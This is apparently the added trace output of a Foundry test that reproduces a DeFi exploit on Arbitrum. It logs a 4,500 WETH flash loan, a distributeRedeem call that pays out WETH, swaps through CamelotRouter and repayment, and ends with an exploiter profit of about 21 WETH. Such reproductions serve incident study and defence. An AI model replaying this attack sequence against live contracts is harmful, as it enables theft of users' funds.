+    │   │   │   │   │   @ 0xf4eee90d715ace4aec48912eda11282b57541920658b4d7ae87f868c6d12ce6a: 0 → 0x000000000000000000000000000000000000000000000001ad8a68d828f72aaa
+    │   │   │   │   │   @ 0xf4eee90d715ace4aec48912eda11282b57541920658b4d7ae87f868c6d12ce69: 0x00000000000000000000000000000000000000000000008cf16a66ed711a0000 → 0x00000000000000000000000000000000000000000000008b43dffe154822d556
+    │   │   │   │   │   @ 14: 0x00000000000000000000000000000000000000000000064e2fdecc3cde1dc8ca → 0x00000000000000000000000000000000000000000000064c82546364b5269e20
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [41033] 0x5ed32847e33844155c18944Ae84459404e432620::distributeRedeem(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], 24844698768393491912 [2.484e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x5ed32847e33844155c18944Ae84459404e432620) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x5ed32847e33844155c18944Ae84459404e432620) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 72668070516983737917 [7.266e19]
+    │   │   │   │   │   └─ ← [Return] 72668070516983737917 [7.266e19]
+    │   │   │   │   ├─ [26900] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24844698768393491912 [2.484e19])
+    │   │   │   │   │   ├─ [26154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24844698768393491912 [2.484e19]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x5ed32847e33844155c18944Ae84459404e432620, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 24844698768393491912 [2.484e19])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x00000000000000000000000000000000000000000000000158ca19e5a1add5c8
+    │   │   │   │   │   │   │   @ 0x1e841bc44b8edc6e661d8adbd90cb42c5b25af9c580d47e3f1159da062ef6652: 0x000000000000000000000000000000000000000000000003f078d91f8dda2e3d → 0x00000000000000000000000000000000000000000000000297aebf39ec2c5875
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 6: 0x000000000000000000000000000000000000000000000000059d720f141beaa4 → 0x0000000000000000000000000000000000000000000000015e678bf4b5c9c06c
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 10: 0x00000000000000000000000000000000000000000000043375776b4f1ef3b401 → 0x000000000000000000000000000000000000000000000431c7ed0276f5fc8957
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 474482066942 [4.744e11]
+    │   │   │   └─ ← [Return] 474482066942 [4.744e11]
+    │   │   ├─ [27939] USDC::approve(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 474482066942 [4.744e11])
+    │   │   │   ├─ [27193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 474482066942 [4.744e11]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 474482066942 [4.744e11])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd1c2880ed467fc05441c3899bc2f9050cf20258cbe22473b4d4acfec588c3270: 0 → 0x0000000000000000000000000000000000000000000000000000006e7955c5fe
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1296] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 474482066942 [4.744e11]
+    │   │   │   └─ ← [Return] 474482066942 [4.744e11]
+    │   │   ├─ [42273] CamelotRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(474482066942 [4.744e11], 0, [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 1706348536 [1.706e9])
+    │   │   │   ├─ [7663] USDC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 474482066942 [4.744e11])
+    │   │   │   │   ├─ [6911] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 474482066942 [4.744e11]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, value: 474482066942 [4.744e11])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd1c2880ed467fc05441c3899bc2f9050cf20258cbe22473b4d4acfec588c3270: 0x0000000000000000000000000000000000000000000000000000006e7955c5fe → 0
+    │   │   │   │   │   │   @ 0x4d2f2a6998b357e93e98b4cd7d173d7f83b92a79d9df666333b30712af552da0: 0x000000000000000000000000000000000000000000000000000000056e902339 → 0x00000000000000000000000000000000000000000000000000000073e7e5e937
+    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x0000000000000000000000000000000000000000000000000000006e7955c5fe → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1296] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 24844698768393491912 [2.484e19]
+    │   │   │   │   └─ ← [Return] 24844698768393491912 [2.484e19]
+    │   │   │   ├─ [529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 4720596413000945024289 [4.72e21], 23329776441 [2.332e10], 300
+    │   │   │   ├─ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
+    │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 497811843383 [4.978e11]
+    │   │   │   │   └─ ← [Return] 497811843383 [4.978e11]
+    │   │   │   ├─ [1736] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(474482066942 [4.744e11], USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000f3e076040b357b1399
+    │   │   │   ├─ [21517] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::swap(4498732929469357167513 [4.498e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, 0x0000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [4200] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4498732929469357167513 [4.498e21])
+    │   │   │   │   │   ├─ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4498732929469357167513 [4.498e21]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4498732929469357167513 [4.498e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x4d2f2a6998b357e93e98b4cd7d173d7f83b92a79d9df666333b30712af552da0: 0x0000000000000000000000000000000000000000000000ffe76f72d52880bd21 → 0x00000000000000000000000000000000000000000000000c06f96ec9f305a988
+    │   │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x00000000000000000000000000000000000000000000000158ca19e5a1add5c8 → 0x0000000000000000000000000000000000000000000000f539401df0d728e961
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 221863483531587856776 [2.218e20]
+    │   │   │   │   │   └─ ← [Return] 221863483531587856776 [2.218e20]
+    │   │   │   │   ├─ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 497811843383 [4.978e11]
+    │   │   │   │   │   └─ ← [Return] 497811843383 [4.978e11]
+    │   │   │   │   ├─ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 497811843383 [4.978e11]
+    │   │   │   │   │   └─ ← [Return] 497811843383 [4.978e11]
+    │   │   │   │   ├─ emit Sync(reserve0: 221863483531587856776 [2.218e20], reserve1: 497811843383 [4.978e11])
+    │   │   │   │   ├─ emit Swap(sender: CamelotRouter: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], amount0In: 0, amount1In: 474482066942 [4.744e11], amount0Out: 4498732929469357167513 [4.498e21], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x012c012c000000000000000000056e9023390000000000ffe76f72d52880bd21 → 0x012c012c00000000000000000073e7e5e93700000000000c06f96ec9f305a988
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1296] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 4523577628237750659425 [4.523e21]
+    │   │   │   │   └─ ← [Return] 4523577628237750659425 [4.523e21]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4200] WETH::transfer(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], 4502250000000000000000 [4.502e21])
+    │   │   │   ├─ [3454] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], 4502250000000000000000 [4.502e21]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], value: 4502250000000000000000 [4.502e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x0000000000000000000000000000000000000000000000f539401df0d728e961 → 0x00000000000000000000000000000000000000000000000127faf4e234b7e961
+    │   │   │   │   │   @ 0x585ee325f1af85f6f3fd85e4ae1c2cf3022b18f1e606c34894149ba54f0331cf: 0x00000000000000000000000000000000000000000000001873ee6ecdc0a7a6d9 → 0x00000000000000000000000000000000000000000000010c853397dc6318a6d9
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit log_string(val: "--------------------End attack--------------------")
+    │   │   └─ ← [Stop]
+    │   ├─ [1296] WETH::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   │   └─ ← [Return] 4953325593957827651289 [4.953e21]
+    │   │   └─ ← [Return] 4953325593957827651289 [4.953e21]
+    │   ├─ [1296] USDC::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(WETH_USDC: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   │   └─ ← [Return] 11376827407693 [1.137e13]
+    │   │   └─ ← [Return] 11376827407693 [1.137e13]
+    │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], qty0: 4500000000000000000000 [4.5e21], qty1: 0, paid0: 2250000000000000000 [2.25e18], paid1: 0)
+    │   ├─  storage changes:
+    │   │   @ 1: 0x00000000000000000000000000000c1b388bed139b8da895e0347bce39a4bd76 → 0x00000000000000000000000000000c1bb9ab5589f9be411e2310a6cd28cdfe17
+    │   └─ ← [Stop]
+    ├─ [1296] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 21327628237750659425 [2.132e19]
+    │   └─ ← [Return] 21327628237750659425 [2.132e19]
+    ├─ [267] CIT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance after attack", val: 21327628237750659425 [2.132e19], decimals: 18)
+    ├─  storage changes:
+    │   @ 0x854ea2fd07e5dadd9d114d48b3d251e413b4228626fde3cefe7f59aef64dfc6b: 0 → 1
+    │   @ 0x854ea2fd07e5dadd9d114d48b3d251e413b4228626fde3cefe7f59aef64dfc68: 0 → 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.67s (14.67s CPU time)
+
+Ran 1 test suite in 20.70s (15.67s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
